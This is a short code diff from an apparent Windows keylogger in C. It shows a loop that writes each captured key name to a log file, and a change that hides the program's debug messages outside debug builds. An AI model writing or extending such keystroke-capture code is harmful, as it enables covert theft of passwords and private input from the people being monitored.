@@ -66,14 +66,18 @@ int main(void)
 
             if (GetKeyNameTextA(lParam, real_key, sizeof(real_key)) == 0) 
             {
-                DEBUG_PRINT("Failed to get name of virtual key!");
+                #ifdef DEBUG
+                    DEBUG_PRINT("Failed to get name of virtual key!");
+                #endif
                 continue;
             }
 
             DWORD bytesWritten;
             if (!WriteFile(logfile, real_key, strlen(real_key), &bytesWritten, NULL)) 
             {
-                DEBUG_PRINT("Failed to write to file!");
+                #ifdef DEBUG
+                    DEBUG_PRINT("Failed to write to file!");
+                #endif
                 continue;
             }
         }
